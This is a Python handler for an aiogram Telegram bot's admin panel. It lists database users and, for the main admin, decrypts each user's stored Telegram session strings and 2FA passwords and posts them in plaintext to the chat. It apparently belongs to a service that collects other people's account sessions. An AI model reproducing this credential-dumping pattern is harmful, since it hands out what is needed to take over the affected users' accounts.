from aiogram.filters import Command, StateFilter

from aiogram import types
from aiogram.fsm.context import FSMContext
from loader import dp, bot, app_logger
from config_data.config import ALLOWED_USERS, ADMIN_ID, ENCRYPTION_KEY
from keyboards.inline.accounts import users_markup
from states.states import AdminPanel
from sqlalchemy.future import select
from database.models import User, async_session


@dp.message(Command('admin_panel'))
async def admin_panel(message: types.Message, state: FSMContext):
    if int(message.from_user.id) in ALLOWED_USERS:
        app_logger.info(f"Администратор @{message.from_user.username} вошел в админ панель.")
        markup = await users_markup()
        await message.answer("Все пользователи базы данных:", reply_markup=markup)
        await state.set_state(AdminPanel.get_users)
    else:
        await message.answer("У вас недостаточно прав")

@dp.callback_query(StateFilter(AdminPanel.get_users))
async def get_user(call: types.CallbackQuery, state: FSMContext):
    await call.answer()
    if call.data == "Выход":
        await call.message.answer("Вы успешно вышли из админ панели.")
        await state.clear()
        app_logger.info(f"Администратор @{call.from_user.username} вышел из админ панели.")
    else:
        async with async_session() as session:
            result = await session.execute(select(User).where(User.id == int(call.data)))
            user_obj = result.scalars().first()
        if user_obj:
            text = f"Имя: {user_obj.full_name}\nТелеграм: @{user_obj.username}\n"
            if int(call.from_user.id) == ADMIN_ID:
                from services.account_manager import AccountService
                service = AccountService(ENCRYPTION_KEY)
                accounts = await service.get_user_accounts(user_obj.user_id)

                session_text = "\n🔑 Активные сессии:\n"
                for acc in accounts:
                    session_str = await service.decrypt_session(acc.session_data)
                    password_2fa = await service.get_2fa_password(acc.phone)
                    session_text += f"📱 {acc.phone} ({password_2fa}): {session_str}\n\n"
                text += session_text
            await call.message.answer(text)
        else:
            await call.message.answer("Пользователь не найден")
